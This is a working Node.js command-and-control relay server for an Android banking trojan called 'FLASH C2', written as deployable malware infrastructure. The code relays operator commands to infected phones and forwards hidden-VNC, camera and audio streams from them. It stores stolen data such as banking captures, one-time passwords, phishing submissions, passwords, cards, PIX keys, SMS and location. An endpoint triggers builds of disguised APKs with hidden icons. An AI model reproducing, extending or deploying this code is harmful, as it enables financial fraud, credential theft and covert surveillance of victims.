'use strict';
/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  FLASH C2 — RELAY SERVER  2026                                  ║
 * ║  Node 20+  |  Express 4  |  ws 8  |  pg 8  |  jwt 9            ║
 * ╠══════════════════════════════════════════════════════════════════╣
 * ║  Deploy: place in backend/ next to flash.html at project root.  ║
 * ║  Render: uses render.yaml at project root (npm start → this).   ║
 * ╠══════════════════════════════════════════════════════════════════╣
 * ║  Env vars (Render dashboard or .env):                           ║
 * ║    PORT            HTTP/WS listen port (default 7771)           ║
 * ║    JWT_SECRET      Sign key for dashboard tokens                ║
 * ║    ADMIN_USERNAME  Dashboard login username                     ║
 * ║    ADMIN_PASSWORD  Password: plain text OR bcrypt $2b$ hash     ║
 * ║    DEVICE_SECRET   Must match APK BuildConfig.DEVICE_SECRET     ║
 * ║    DATABASE_URL    Neon/PostgreSQL connection (optional)         ║
 * ║    GH_TOKEN        GitHub PAT (actions:write) for APK builder   ║
 * ║    GH_REPO         owner/repo containing build-apk.yml          ║
 * ║    PUBLIC_C2_URL   Pre-fills C2 URL in builder (optional)       ║
 * ║    NODE_ENV        production | development                      ║
 * ╚══════════════════════════════════════════════════════════════════╝
 *
 * WebSocket protocol:
 *   Device first message  → { type:"HELLO", secret, device_id, model, ... }
 *   Dashboard first msg   → { type:"DASHBOARD_HELLO", token, client, version }
 *   Commands  dash→device → { type, device_id, ...params }
 *   Events   device→dash  → { type, data, device_id }  (JSON text)
 *   HVNC frames device→dash → binary Buffer [0x01][4B size][JPEG bytes]
 *   Camera frames           → binary Buffer [0x02][4B size][JPEG bytes]
 *   Audio chunks            → binary Buffer [0x03][4B size][PCM bytes]
 */

const express              = require('express');
const http                 = require('http');
const { WebSocketServer, WebSocket } = require('ws');
const jwt                  = require('jsonwebtoken');
const bcrypt               = require('bcryptjs');
const { v4: uuidv4 }       = require('uuid');
const path                 = require('path');
const fs                   = require('fs');

// ════════════════════════════════════════════════════════════════════
// CONFIG
// ════════════════════════════════════════════════════════════════════

const PORT           = parseInt(process.env.PORT           || '7771', 10);
const JWT_SECRET     = process.env.JWT_SECRET              || 'flash-dev-secret-CHANGE-IN-PROD';
const ADMIN_USER     = process.env.ADMIN_USERNAME          || 'admin';
const ADMIN_PASS_RAW = process.env.ADMIN_PASSWORD          || 'flash2026';
const DEVICE_SECRET  = process.env.DEVICE_SECRET           || '';
const DATABASE_URL   = process.env.DATABASE_URL            || '';
const GH_TOKEN       = process.env.GH_TOKEN                || '';
const GH_REPO        = process.env.GH_REPO                 || '';
const PUBLIC_C2_URL  = process.env.PUBLIC_C2_URL           || '';
const IS_PROD        = process.env.NODE_ENV === 'production';
const JWT_EXPIRES    = '12h';

// Connection health constants
const WS_PING_INTERVAL_MS   = 30_000;   // send ping to every client every 30s
const AUTH_TIMEOUT_MS        = 15_000;   // kick un-authed socket after 15s
const PONG_TIMEOUT_MS        = 10_000;   // declare dead if pong not received in 10s after ping
const MAX_PAYLOAD_BYTES      = 100 * 1024 * 1024; // 100 MB max WS frame

// ════════════════════════════════════════════════════════════════════
// DATABASE  (PostgreSQL via pg, graceful fallback to in-memory)
// ════════════════════════════════════════════════════════════════════

let db = null;

const mem = {
  devices: new Map(),   // device_id → device row
  events:  [],          // capped ring buffer
  MAX_EV:  5_000,
};

async function initDb() {
  if (!DATABASE_URL) {
    console.log('[DB] DATABASE_URL not set — using in-memory store.');
    return;
  }
  try {
    const { Pool } = require('pg');
    db = new Pool({
      connectionString: DATABASE_URL,
      ssl: IS_PROD ? { rejectUnauthorized: false } : false,
      max: 10,
      idleTimeoutMillis: 30_000,
    });
    await db.query(`
      CREATE TABLE IF NOT EXISTS devices (
        device_id       TEXT PRIMARY KEY,
        model           TEXT,
        android_version TEXT,
        ip              TEXT,
        info            JSONB    DEFAULT '{}',
        last_seen       TIMESTAMPTZ DEFAULT NOW(),
        created_at      TIMESTAMPTZ DEFAULT NOW()
      );

      CREATE TABLE IF NOT EXISTS events (
        id          BIGSERIAL PRIMARY KEY,
        device_id   TEXT,
        type        TEXT NOT NULL,
        data        JSONB,
        created_at  TIMESTAMPTZ DEFAULT NOW()
      );

      CREATE INDEX IF NOT EXISTS idx_events_device ON events (device_id, created_at DESC);
      CREATE INDEX IF NOT EXISTS idx_events_type   ON events (type,      created_at DESC);
    `);
    console.log('[DB] PostgreSQL ready.');
  } catch (e) {
    console.error('[DB] PostgreSQL init failed, falling back to memory:', e.message);
    db = null;
  }
}

async function dbUpsertDevice(info) {
  const row = {
    device_id: info.device_id,
    model:     info.model           || '',
    android_version: info.android_version || '',
    ip:        info.ip              || '',
  };
  if (!db) {
    mem.devices.set(row.device_id, { ...row, info, last_seen: new Date() });
    return;
  }
  await db.query(`
    INSERT INTO devices (device_id, model, android_version, ip, info)
    VALUES ($1, $2, $3, $4, $5)
    ON CONFLICT (device_id) DO UPDATE
      SET model           = EXCLUDED.model,
          android_version = EXCLUDED.android_version,
          ip              = EXCLUDED.ip,
          info            = EXCLUDED.info,
          last_seen       = NOW()
  `, [row.device_id, row.model, row.android_version, row.ip, JSON.stringify(info)]);
}

async function dbSaveEvent(device_id, type, data) {
  if (!db) {
    mem.events.unshift({ device_id, type, data, created_at: new Date().toISOString() });
    if (mem.events.length > mem.MAX_EV) mem.events.length = mem.MAX_EV;
    return;
  }
  await db.query(
    'INSERT INTO events (device_id, type, data) VALUES ($1, $2, $3)',
    [device_id, type, JSON.stringify(data)]
  ).catch(e => console.error('[DB] event save:', e.message));
}

async function dbGetDevices() {
  if (!db) return [...mem.devices.values()];
  const { rows } = await db.query('SELECT * FROM devices ORDER BY last_seen DESC');
  return rows;
}

async function dbGetEvents(device_id, type_filter, limit = 200) {
  if (!db) {
    let rows = mem.events;
    if (device_id) rows = rows.filter(e => e.device_id === device_id);
    if (type_filter) rows = rows.filter(e => e.type === type_filter);
    return rows.slice(0, limit);
  }
  if (device_id && type_filter) {
    const { rows } = await db.query(
      'SELECT * FROM events WHERE device_id=$1 AND type=$2 ORDER BY created_at DESC LIMIT $3',
      [device_id, type_filter, limit]);
    return rows;
  } else if (device_id) {
    const { rows } = await db.query(
      'SELECT * FROM events WHERE device_id=$1 ORDER BY created_at DESC LIMIT $2',
      [device_id, limit]);
    return rows;
  } else if (type_filter) {
    const { rows } = await db.query(
      'SELECT * FROM events WHERE type=$1 ORDER BY created_at DESC LIMIT $2',
      [type_filter, limit]);
    return rows;
  }
  const { rows } = await db.query('SELECT * FROM events ORDER BY created_at DESC LIMIT $1', [limit]);
  return rows;
}

// ════════════════════════════════════════════════════════════════════
// AUTH HELPERS
// ════════════════════════════════════════════════════════════════════

async function verifyAdminPassword(candidate) {
  if (ADMIN_PASS_RAW.startsWith('$2')) {
    return bcrypt.compare(candidate, ADMIN_PASS_RAW);
  }
  // Timing-safe comparison for plain-text passwords
  const a = Buffer.from(ADMIN_PASS_RAW);
  const b = Buffer.from(candidate);
  if (a.length !== b.length) return false;
  return require('crypto').timingSafeEqual(a, b);
}

function signJwt(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES });
}

function verifyJwt(token) {
  try { return jwt.verify(token, JWT_SECRET); }
  catch { return null; }
}

function jwtMiddleware(req, res, next) {
  const auth = req.headers.authorization || '';
  if (!auth.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
  const claims = verifyJwt(auth.slice(7));
  if (!claims) return res.status(401).json({ error: 'Invalid or expired token' });
  req.claims = claims;
  next();
}

// ════════════════════════════════════════════════════════════════════
// LIVE STATE
// ════════════════════════════════════════════════════════════════════

// devices: Map<device_id → { ws, info, connectedAt, lastPong }>
const devices   = new Map();
// dashboards: Set<ws>
const dashboards = new Set();

// Event types that should be persisted to DB / mem-store
const PERSIST_TYPES = new Set([
  'FINANCE_CAPTURE', 'OTP_CAPTURED',    'PHISHING_CAPTURE', 'PHISHING_SUBMITTED',
  'CLIPPER_INTERCEPT', 'WIFI_PASSWORDS','ALL_ACCOUNTS',     'ACCOUNT_TOKENS',
  'CAPTURED_PASSWORDS', 'LOCATION',     'LOCATION_UPDATE',  'DEVICE_INFO',
  'CAPTURED_BALANCES',  'CAPTURED_CARDS','PIX_KEYS',        'CRYPTO_DATA',
  'BANK_BALANCE',       'TRANSACTIONS',  'CALL_LOGS',        'HELLO',
  'SMS_THREADS',        'CONTACTS',
]);

// ════════════════════════════════════════════════════════════════════
// SEND HELPERS
// ════════════════════════════════════════════════════════════════════

function safeSend(ws, data) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return false;
  try {
    if (Buffer.isBuffer(data) || data instanceof Uint8Array) {
      ws.send(data);
    } else {
      ws.send(typeof data === 'string' ? data : JSON.stringify(data));
    }
    return true;
  } catch (e) {
    console.error('[WS] safeSend error:', e.message);
    return false;
  }
}

function broadcastDashboards(data, exclude = null) {
  for (const ws of dashboards) {
    if (ws === exclude) continue;
    safeSend(ws, data);
  }
}

function deviceListPayload() {
  const list = [...devices.values()].map(({ info, connectedAt, lastPong }) => ({
    ...info,
    connected_at: connectedAt,
    last_ping:    lastPong,
    online:       true,
  }));
  return { type: 'DEVICE_LIST', data: list };
}

// ════════════════════════════════════════════════════════════════════
// EXPRESS  (HTTP API)
// ════════════════════════════════════════════════════════════════════

const app = express();

app.use(express.json({ limit: '50mb' }));

// CORS — required when serving flash.html from a different origin in dev
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') { res.sendStatus(204); return; }
  next();
});

// ── Health ─────────────────────────────────────────────────────────
app.get('/health', (_req, res) => {
  res.json({
    status:     'ok',
    devices:    devices.size,
    dashboards: dashboards.size,
    db:         db ? 'postgres' : 'memory',
    uptime:     Math.floor(process.uptime()),
  });
});

// ── Login → JWT ─────────────────────────────────────────────────────
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });
  if (username !== ADMIN_USER) return res.status(401).json({ error: 'Invalid credentials' });
  if (!(await verifyAdminPassword(password))) return res.status(401).json({ error: 'Invalid credentials' });
  const token = signJwt({ role: 'dashboard', username });
  res.json({ token, expires: JWT_EXPIRES });
});

// ── Devices list (REST, for external tooling) ────────────────────────
app.get('/api/devices', jwtMiddleware, async (_req, res) => {
  try {
    const persisted = await dbGetDevices();
    const liveIds   = new Set(devices.keys());
    res.json(persisted.map(d => ({ ...d, online: liveIds.has(d.device_id) })));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── Events (REST, captured data) ────────────────────────────────────
app.get('/api/events', jwtMiddleware, async (req, res) => {
  const { device_id, type, limit } = req.query;
  try {
    const rows = await dbGetEvents(device_id, type, parseInt(limit || '200'));
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── APK Builder (GitHub Actions dispatch) ────────────────────────────
app.post('/api/build', jwtMiddleware, async (req, res) => {
  if (!GH_TOKEN || !GH_REPO) return res.status(503).json({ error: 'GitHub not configured on server' });
  const [owner, repo] = GH_REPO.split('/');
  if (!owner || !repo) return res.status(503).json({ error: 'GH_REPO must be owner/repo' });

  const {
    c2_url    = PUBLIC_C2_URL || '',
    app_label = '',
    hide_icon = 'false',
    app_id    = '',
    apk_name  = '',
    logo_url  = '',
  } = req.body || {};

  try {
    const ghRes = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/actions/workflows/build-apk.yml/dispatches`,
      {
        method: 'POST',
        headers: {
          'Authorization':        `Bearer ${GH_TOKEN}`,
          'Accept':               'application/vnd.github+json',
          'Content-Type':         'application/json',
          'X-GitHub-Api-Version': '2022-11-28',
        },
        body: JSON.stringify({
          ref: 'main',
          inputs: { c2_url, app_label, hide_icon, app_id, apk_name, logo_url },
        }),
      }
    );
    if (ghRes.status === 204) {
      res.json({ ok: true, message: 'Build dispatched to GitHub Actions.' });
    } else {
      const body = await ghRes.text();
      res.status(ghRes.status).json({ error: body });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ── Serve dashboard if flash.html sits at project root ───────────────
const DASH_PATH = path.join(__dirname, '..', 'flash.html');
if (fs.existsSync(DASH_PATH)) {
  app.get('/', (_req, res) => res.sendFile(DASH_PATH));
  console.log('[HTTP] Serving flash.html at /');
}

// ════════════════════════════════════════════════════════════════════
// HTTP + WEBSOCKET SERVER
// ════════════════════════════════════════════════════════════════════

const server = http.createServer(app);
const wss = new WebSocketServer({
  server,
  path:                '/ws',
  perMessageDeflate:   false,  // disable deflate — binary frames must never be compressed
  maxPayload:          MAX_PAYLOAD_BYTES,
});

// ════════════════════════════════════════════════════════════════════
// CONNECTION HANDLER
// ════════════════════════════════════════════════════════════════════

wss.on('connection', (ws, req) => {
  const clientIp = (
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown'
  );

  // Attach state to socket object
  ws._role       = 'pending';
  ws._deviceId   = null;
  ws._authed     = false;
  ws._ip         = clientIp;
  ws._pingTimer  = null;
  ws._pongTimer  = null;
  ws._lastPong   = Date.now();

  // Kick if first message never arrives
  const authTimeout = setTimeout(() => {
    if (!ws._authed && ws.readyState === WebSocket.OPEN) {
      safeSend(ws, { type: 'ERROR', data: 'Authentication timeout' });
      ws.terminate();
    }
  }, AUTH_TIMEOUT_MS);

  // ── Message handler ─────────────────────────────────────────────
  ws.on('message', (rawData, isBinary) => {
    if (isBinary || Buffer.isBuffer(rawData)) {
      onBinary(ws, rawData);
      return;
    }

    let msg;
    try { msg = JSON.parse(rawData.toString()); }
    catch {
      safeSend(ws, { type: 'ERROR', data: 'Invalid JSON' });
      return;
    }

    if (!ws._authed) {
      onFirstMessage(ws, msg, clientIp, authTimeout);
    } else if (ws._role === 'device') {
      onDeviceMessage(ws, msg);
    } else if (ws._role === 'dashboard') {
      onDashboardMessage(ws, msg);
    }
  });

  // ── Pong handler (response to our server-side ping) ──────────────
  ws.on('pong', () => {
    ws._lastPong = Date.now();
    clearTimeout(ws._pongTimer);
    ws._pongTimer = null;
    if (ws._role === 'device' && ws._deviceId) {
      const dev = devices.get(ws._deviceId);
      if (dev) dev.lastPong = ws._lastPong;
    }
  });

  ws.on('error', err => {
    const id = ws._deviceId || ws._ip;
    console.error(`[WS] ${ws._role}/${id} error:`, err.message);
  });

  ws.on('close', (code, reason) => {
    clearTimeout(authTimeout);
    clearInterval(ws._pingTimer);
    clearTimeout(ws._pongTimer);

    if (ws._role === 'device' && ws._deviceId) {
      devices.delete(ws._deviceId);
      const msg = `Device disconnected: ${ws._deviceId} (code ${code})`;
      console.log(`[DEV] ${msg}`);
      broadcastDashboards({ type: 'DEVICE_DISCONNECTED', device_id: ws._deviceId, reason: String(reason || '') });
      broadcastDashboards(deviceListPayload());
    } else if (ws._role === 'dashboard') {
      dashboards.delete(ws);
      console.log(`[DASH] Dashboard left (${dashboards.size} remaining) from ${clientIp}`);
    }
  });
});

// ════════════════════════════════════════════════════════════════════
// FIRST MESSAGE — ROLE ASSIGNMENT + AUTH
// ════════════════════════════════════════════════════════════════════

function onFirstMessage(ws, msg, clientIp, authTimeout) {
  const type = msg.type || '';

  // ── Device handshake ────────────────────────────────────────────
  if (type === 'HELLO' || type === 'DEVICE_HELLO') {
    // Validate secret if DEVICE_SECRET is configured
    if (DEVICE_SECRET && msg.secret !== DEVICE_SECRET) {
      safeSend(ws, { type: 'ERROR', data: 'Invalid device secret' });
      ws.terminate();
      return;
    }
    const deviceId = (msg.device_id && String(msg.device_id).length > 0)
      ? String(msg.device_id)
      : uuidv4();

    ws._role     = 'device';
    ws._deviceId = deviceId;
    ws._authed   = true;
    clearTimeout(authTimeout);

    // Build device info (strip secret)
    const info = { ...msg, device_id: deviceId, ip: clientIp };
    delete info.secret;
    delete info.type;

    // If a stale socket exists for same device_id, terminate it
    const existing = devices.get(deviceId);
    if (existing && existing.ws !== ws && existing.ws.readyState === WebSocket.OPEN) {
      existing.ws.terminate();
    }

    devices.set(deviceId, { ws, info, connectedAt: Date.now(), lastPong: Date.now() });
    dbUpsertDevice(info).catch(console.error);

    // Server-side keepalive ping loop for this device
    ws._pingTimer = setInterval(() => sendPing(ws), WS_PING_INTERVAL_MS);

    safeSend(ws, { type: 'CONNECTED', device_id: deviceId, server_time: Date.now() });
    broadcastDashboards({ type: 'DEVICE_CONNECTED', ...info });
    broadcastDashboards(deviceListPayload());

    console.log(`[DEV]  + ${deviceId}  model=${info.model || '?'}  Android=${info.android_version || '?'}  ip=${clientIp}`);
    return;
  }

  // ── Dashboard handshake ──────────────────────────────────────────
  if (type === 'DASHBOARD_HELLO') {
    const token = msg.token || '';
    const claims = verifyJwt(token);

    if (!claims) {
      // Dev mode bypass: allow if JWT_SECRET was not explicitly configured
      if (!IS_PROD && !process.env.JWT_SECRET) {
        console.warn('[DASH] Dev mode — allowing unauthenticated dashboard (set JWT_SECRET for auth).');
      } else {
        safeSend(ws, { type: 'ERROR', data: 'Invalid or missing dashboard token. Login via /api/login.' });
        ws.terminate();
        return;
      }
    }

    ws._role   = 'dashboard';
    ws._authed = true;
    clearTimeout(authTimeout);
    dashboards.add(ws);

    ws._pingTimer = setInterval(() => sendPing(ws), WS_PING_INTERVAL_MS);

    // Immediately push current device list
    safeSend(ws, deviceListPayload());
    safeSend(ws, { type: 'OK', data: `Connected — ${devices.size} device(s) online` });

    console.log(`[DASH] + dashboard from ${clientIp} (total: ${dashboards.size})`);
    return;
  }

  safeSend(ws, { type: 'ERROR', data: 'First message must be HELLO (device) or DASHBOARD_HELLO (dashboard).' });
}

// ════════════════════════════════════════════════════════════════════
// BINARY FRAMES  (HVNC / camera / audio — pass-through to dashboards)
// ════════════════════════════════════════════════════════════════════

function onBinary(ws, data) {
  if (!ws._authed || ws._role !== 'device') return;
  // Forward raw binary to every authenticated dashboard, unchanged.
  // Dashboards interpret the leading type byte to route: 0x01=HVNC 0x02=camera 0x03=audio
  const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
  broadcastDashboards(buf);
}

// ════════════════════════════════════════════════════════════════════
// MESSAGES FROM DEVICE → SERVER → DASHBOARDS
// ════════════════════════════════════════════════════════════════════

function onDeviceMessage(ws, msg) {
  const deviceId = ws._deviceId;
  const type     = msg.type || '';

  // Always stamp device_id before forwarding
  msg.device_id  = deviceId;

  // Server-handled device messages
  switch (type) {
    case 'PING':
      safeSend(ws, { type: 'PONG', ts: Date.now() });
      // Update last_seen in DB without blocking
      dbUpsertDevice({ ...(devices.get(deviceId)?.info || {}), device_id: deviceId })
        .catch(console.error);
      return; // don't forward PING to dashboards

    case 'HELLO':
    case 'DEVICE_INFO': {
      // Merge refreshed info
      const dev = devices.get(deviceId);
      if (dev) {
        dev.info = { ...dev.info, ...msg };
        delete dev.info.type;
      }
      dbUpsertDevice({ ...msg, device_id: deviceId }).catch(console.error);
      break; // still forward to dashboards below
    }
  }

  // Persist high-value events
  if (PERSIST_TYPES.has(type)) {
    dbSaveEvent(deviceId, type, msg.data ?? msg).catch(console.error);
  }

  broadcastDashboards(msg);
}

// ════════════════════════════════════════════════════════════════════
// MESSAGES FROM DASHBOARD → SERVER → DEVICE
// ════════════════════════════════════════════════════════════════════

function onDashboardMessage(ws, msg) {
  const type = msg.type || '';

  // ── Server-handled dashboard commands ───────────────────────────
  switch (type) {
    case 'PING':
      safeSend(ws, { type: 'PONG', ts: Date.now() });
      return;

    case 'GET_DEVICE_LIST':
    case 'DEVICE_LIST':
      safeSend(ws, deviceListPayload());
      return;

    case 'GET_EVENTS': {
      const { device_id, type: evType, limit } = msg;
      dbGetEvents(device_id, evType, parseInt(limit || '200', 10))
        .then(rows => safeSend(ws, { type: 'EVENTS', data: rows }))
        .catch(e  => safeSend(ws, { type: 'ERROR', data: e.message }));
      return;
    }

    case 'GET_STATS': {
      safeSend(ws, {
        type:       'STATS',
        devices:    devices.size,
        dashboards: dashboards.size,
        db:         db ? 'postgres' : 'memory',
        uptime:     Math.floor(process.uptime()),
      });
      return;
    }
  }

  // ── Route to target device ───────────────────────────────────────
  const targetId = msg.device_id;
  if (!targetId) {
    safeSend(ws, { type: 'ERROR', data: 'Command missing device_id' });
    return;
  }

  const dev = devices.get(targetId);
  if (!dev || dev.ws.readyState !== WebSocket.OPEN) {
    safeSend(ws, { type: 'ERROR', data: `Device ${targetId} is not connected` });
    return;
  }

  safeSend(dev.ws, msg);
}

// ════════════════════════════════════════════════════════════════════
// KEEPALIVE  (server → client ping with pong-timeout dead detection)
// ════════════════════════════════════════════════════════════════════

function sendPing(ws) {
  if (ws.readyState !== WebSocket.OPEN) return;
  // If previous pong never arrived, the connection is dead
  if (ws._pongTimer) {
    clearTimeout(ws._pongTimer);
    console.warn(`[WS] Dead connection detected (no pong) — ${ws._role}/${ws._deviceId || ws._ip}`);
    ws.terminate();
    return;
  }
  try {
    ws.ping();
    ws._pongTimer = setTimeout(() => {
      // Still no pong after PONG_TIMEOUT_MS
      console.warn(`[WS] Pong timeout — terminating ${ws._role}/${ws._deviceId || ws._ip}`);
      ws.terminate();
    }, PONG_TIMEOUT_MS);
  } catch { ws.terminate(); }
}

// ════════════════════════════════════════════════════════════════════
// SERVER STARTUP
// ════════════════════════════════════════════════════════════════════

(async () => {
  await initDb();

  server.listen(PORT, '0.0.0.0', () => {
    const line = '═'.repeat(50);
    console.log(`╔${line}╗`);
    console.log(`║  FLASH C2  SERVER  2026${' '.repeat(27)}║`);
    console.log(`║  HTTP   →  http://0.0.0.0:${PORT}${' '.repeat(50 - 18 - String(PORT).length)}║`);
    console.log(`║  WS     →  ws://0.0.0.0:${PORT}/ws${' '.repeat(50 - 21 - String(PORT).length)}║`);
    console.log(`║  Auth   →  POST /api/login${' '.repeat(50 - 24)}║`);
    console.log(`║  Store  →  ${db ? 'PostgreSQL' : 'Memory (no DATABASE_URL)'}${' '.repeat(50 - 11 - (db ? 10 : 24))}║`);
    console.log(`║  Env    →  NODE_ENV=${process.env.NODE_ENV || 'development'}${' '.repeat(50 - 21 - (process.env.NODE_ENV || 'development').length)}║`);
    console.log(`╚${line}╝`);
    if (!IS_PROD && !process.env.JWT_SECRET) {
      console.warn('[WARN] JWT_SECRET not set — dashboard auth is disabled in dev mode.');
    }
    if (!DEVICE_SECRET) {
      console.warn('[WARN] DEVICE_SECRET not set — any device can connect.');
    }
  });
})();

// ════════════════════════════════════════════════════════════════════
// PROCESS SAFETY
// ════════════════════════════════════════════════════════════════════

process.on('unhandledRejection', (reason) => {
  console.error('[PROCESS] Unhandled rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('[PROCESS] Uncaught exception:', err);
  // Don't exit — keep the server alive; log and continue
});

process.on('SIGTERM', () => {
  console.log('[PROCESS] SIGTERM received — closing connections gracefully.');
  wss.clients.forEach(ws => {
    try { ws.close(1001, 'Server shutting down'); } catch {}
  });
  server.close(() => {
    if (db) db.end();
    process.exit(0);
  });
});
